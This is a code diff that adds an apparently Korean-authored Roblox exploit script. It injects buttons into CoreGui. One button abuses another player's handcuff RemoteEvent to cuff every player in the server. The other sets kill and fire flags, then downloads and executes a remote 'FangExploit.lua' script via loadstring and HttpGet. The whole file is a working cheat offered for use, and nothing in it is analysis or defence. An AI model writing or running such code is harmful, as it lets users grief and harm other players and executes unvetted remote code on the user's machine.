@@ -1,0 +1,91 @@
+local ScreenGui = Instance.new("ScreenGui")
+local TopButton = Instance.new("TextButton")
+local BottomButton = Instance.new("TextButton")
+
+ScreenGui.Parent = game:GetService("CoreGui")
+
+-- 버튼 기본 설정
+local function setupButton(button, text, posY)
+    button.Parent = ScreenGui
+    button.Size = UDim2.new(0, 200, 0, 50)
+    button.Position = UDim2.new(0, 20, 0.5, posY)
+    button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    button.TextColor3 = Color3.fromRGB(0, 0, 0)
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 18
+    button.Text = text
+end
+
+setupButton(TopButton, "모두 묶기", -60)
+setupButton(BottomButton, "킬올", 10)
+
+-- 서비스 참조
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+-- 수갑을 소유한 플레이어 찾기
+local function findPlayerWithCuffs()
+	for _, player in ipairs(Players:GetPlayers()) do
+		local backpack = player:FindFirstChild("Backpack")
+		if backpack and backpack:FindFirstChild("수갑") then
+			return player
+		end
+	end
+	return nil
+end
+
+-- 모든 플레이어를 수갑으로 묶기
+local function cuffAllPlayers()
+	local playerWithCuffs = findPlayerWithCuffs()
+	if playerWithCuffs then
+		local backpack = playerWithCuffs:FindFirstChild("Backpack")
+		local cuffs = backpack and backpack:FindFirstChild("수갑")
+
+		if cuffs and cuffs:FindFirstChild("RemoteEvent") then
+			local remoteEvent = cuffs.RemoteEvent
+
+			for _, targetPlayer in ipairs(Players:GetPlayers()) do
+				if targetPlayer ~= playerWithCuffs and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") and localPlayer ~= targetPlayer then
+					local args = {
+						[1] = "Cuff",
+						[2] = targetPlayer.Character.Head
+					}
+
+					local success, err = pcall(function()
+						remoteEvent:FireServer(unpack(args))
+					end)
+
+					if not success then
+						warn("Error firing RemoteEvent for:", targetPlayer.Name, err)
+					end
+
+					wait(0.1) -- 서버 요청 처리 지연
+				end
+			end
+		else
+			print("Player with cuffs does not have the RemoteEvent.")
+		end
+	else
+		print("No player with handcuffs found.")
+	end
+end
+
+-- 메시지 출력 함수
+local function showMessage(msg)
+    print(msg)
+end
+
+-- 위 버튼 기능: ALL Cuff 실행
+TopButton.MouseButton1Click:Connect(function()
+    showMessage("ALL Cuff")
+    cuffAllPlayers()
+end)
+
+-- 아래 버튼 기능: FangExploit 실행
+BottomButton.MouseButton1Click:Connect(function()
+    getgenv().exclude_me = true -- 본인 제외 여부
+    getgenv().kill = true -- 죽일지 여부
+    getgenv().fire = true -- 불을 붙일지 여부
+    local func = ({pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/xsinew/scripts/refs/heads/main/FangExploit.lua"))})[2]
+    pcall(func, func)
+end)
